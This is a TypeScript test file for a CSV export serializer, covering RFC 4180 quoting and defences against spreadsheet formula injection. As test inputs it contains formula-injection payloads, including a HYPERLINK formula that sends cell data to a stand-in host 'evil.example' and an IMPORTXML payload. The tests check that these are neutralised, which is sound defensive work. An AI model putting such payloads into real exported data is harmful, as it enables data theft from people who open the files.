import { describe, expect, it } from "vitest";

import { toCsv } from "./csv";

/**
 * Tests for the CSV serialization library used by export endpoints.
 *
 * These tests are security-load-bearing, not just correctness checks:
 * exported cells (task titles, group names, labels) are USER-CONTROLLED, and
 * a cell starting with `=` `+` `-` `@` (or leading TAB/CR) is executed as a
 * formula by Excel / Google Sheets / LibreOffice — a known data-exfiltration
 * and RCE-adjacent vector (e.g. `=HYPERLINK(...)`, DDE payloads). The
 * injection-hardening tests pin the OWASP single-quote mitigation, and the
 * negative-number tests pin the deliberate exemption for numeric cells so a
 * cost of -5 stays a summable number instead of becoming the text `'-5`.
 * Regressions in the RFC 4180 quoting tests would silently corrupt every
 * export the moment a title contains a comma, quote, or newline.
 */

describe("toCsv", () => {
  it("serializes plain values with CRLF line endings and a trailing CRLF", () => {
    const csv = toCsv(["title", "group"], [
      { title: "Write spec", group: "Backlog" },
      { title: "Ship it", group: "Done" },
    ]);
    expect(csv).toBe("title,group\r\nWrite spec,Backlog\r\nShip it,Done\r\n");
  });

  it("returns headers only (plus trailing CRLF) for an empty rows array", () => {
    expect(toCsv(["title", "group", "cost"], [])).toBe("title,group,cost\r\n");
  });

  it("quotes fields containing embedded commas", () => {
    const csv = toCsv(["title"], [{ title: "Fix login, signup, and logout" }]);
    expect(csv).toBe('title\r\n"Fix login, signup, and logout"\r\n');
  });

  it("quotes fields containing double quotes and doubles the embedded quotes", () => {
    const csv = toCsv(["title"], [{ title: 'The "big" rewrite' }]);
    expect(csv).toBe('title\r\n"The ""big"" rewrite"\r\n');
  });

  it("quotes fields containing an embedded LF newline", () => {
    const csv = toCsv(["notes"], [{ notes: "line one\nline two" }]);
    expect(csv).toBe('notes\r\n"line one\nline two"\r\n');
  });

  it("quotes fields containing an embedded CRLF newline", () => {
    const csv = toCsv(["notes"], [{ notes: "line one\r\nline two" }]);
    expect(csv).toBe('notes\r\n"line one\r\nline two"\r\n');
  });

  it("quotes the header cell itself when a header contains a comma", () => {
    // Headers go through the same escaping pipeline as data cells.
    expect(toCsv(["name, full"], [])).toBe('"name, full"\r\n');
  });

  describe("formula-injection hardening", () => {
    it.each([
      ["=", "=1+1", "'=1+1"],
      ["+", "+SUM(A1:A9)", "'+SUM(A1:A9)"],
      ["-", "-2+3", "'-2+3"],
      ["@", "@cmd", "'@cmd"],
    ])("prefixes string cells starting with %s using a single quote", (_char, input, expected) => {
      expect(toCsv(["title"], [{ title: input }])).toBe(`title\r\n${expected}\r\n`);
    });

    it("hardens the classic HYPERLINK exfiltration payload", () => {
      const payload = '=HYPERLINK("https://evil.example/?leak="&A1,"click me")';
      const csv = toCsv(["title"], [{ title: payload }]);
      // Hardened first, then quoted (it contains commas and quotes).
      expect(csv).toBe(
        'title\r\n"\'=HYPERLINK(""https://evil.example/?leak=""&A1,""click me"")"\r\n',
      );
    });

    it("hardens leading TAB, which Excel strips before formula detection", () => {
      // TAB does not itself require RFC 4180 quoting, so the result stays unquoted.
      expect(toCsv(["title"], [{ title: "\t=1+1" }])).toBe("title\r\n'\t=1+1\r\n");
    });

    it("hardens leading CR, which then also triggers quoting (CR is a quotable char)", () => {
      expect(toCsv(["title"], [{ title: "\r=1+1" }])).toBe('title\r\n"\'\r=1+1"\r\n');
    });

    it("does not quote a hardened cell unless it otherwise needs quoting", () => {
      // The ' prefix alone never forces quotes...
      expect(toCsv(["a"], [{ a: "=safe" }])).toBe("a\r\n'=safe\r\n");
      // ...but quoting still applies when the content demands it.
      expect(toCsv(["a"], [{ a: "=a,b" }])).toBe('a\r\n"\'=a,b"\r\n');
    });

    it("leaves strings with formula characters in non-leading positions untouched", () => {
      expect(toCsv(["title"], [{ title: "a=b" }])).toBe("title\r\na=b\r\n");
      expect(toCsv(["title"], [{ title: "1 + 1" }])).toBe("title\r\n1 + 1\r\n");
    });

    it("exempts negative NUMBERS but hardens negative-looking STRINGS", () => {
      // Pinned decision: numeric cells come from typed DB columns and cannot
      // carry formula payloads, so a numeric cost of -5 must export as a
      // summable -5 — while the user-controlled string "-5" gets hardened.
      const csv = toCsv(["cost", "title"], [{ cost: -5, title: "-5" }]);
      expect(csv).toBe("cost,title\r\n-5,'-5\r\n");
    });
  });

  describe("non-string values", () => {
    it("serializes null and undefined as empty fields", () => {
      const csv = toCsv(["a", "b", "c"], [{ a: null, b: undefined, c: "x" }]);
      expect(csv).toBe("a,b,c\r\n,,x\r\n");
    });

    it("serializes fully empty rows as bare comma-separated empties", () => {
      const csv = toCsv(["a", "b"], [{ a: "", b: null }]);
      expect(csv).toBe("a,b\r\n,\r\n");
    });

    it("stringifies numbers plainly, including zero, floats, and negatives", () => {
      const csv = toCsv(["a", "b", "c"], [{ a: 0, b: 3.14, c: -42 }]);
      expect(csv).toBe("a,b,c\r\n0,3.14,-42\r\n");
    });

    it("stringifies booleans plainly", () => {
      const csv = toCsv(["completed", "archived"], [{ completed: true, archived: false }]);
      expect(csv).toBe("completed,archived\r\ntrue,false\r\n");
    });
  });

  it("passes unicode through unmodified", () => {
    const csv = toCsv(["title", "assignee"], [
      { title: "Déployer la fonctionnalité 🚀", assignee: "山田太郎" },
    ]);
    expect(csv).toBe("title,assignee\r\nDéployer la fonctionnalité 🚀,山田太郎\r\n");
  });

  it("uses CRLF (not bare LF) between every record", () => {
    const csv = toCsv(["a"], [{ a: "1" }, { a: "2" }, { a: "3" }]);
    // Every LF in the output must be part of a CRLF pair.
    expect(csv.replaceAll("\r\n", "")).not.toContain("\n");
    expect(csv.match(/\r\n/g)).toHaveLength(4); // header + 3 rows, each terminated
  });

  it("produces the realistic task-export shape the endpoint will emit", () => {
    const headers = [
      "title",
      "group",
      "assignee_email",
      "due_date",
      "priority",
      "labels",
      "completed",
      "cost",
    ] as const;
    const csv = toCsv(headers, [
      {
        title: "=IMPORTXML(evil), pwn",
        group: "Sprint 12",
        assignee_email: "dev@example.com",
        due_date: "2026-06-30",
        priority: "high",
        labels: "bug, urgent",
        completed: false,
        cost: -5,
      },
      {
        title: "Plain task",
        group: null,
        assignee_email: undefined,
        due_date: null,
        priority: "low",
        labels: "",
        completed: true,
        cost: 0,
      },
    ]);
    expect(csv).toBe(
      "title,group,assignee_email,due_date,priority,labels,completed,cost\r\n" +
        '"\'=IMPORTXML(evil), pwn",Sprint 12,dev@example.com,2026-06-30,high,"bug, urgent",false,-5\r\n' +
        "Plain task,,,,low,,true,0\r\n",
    );
  });
});
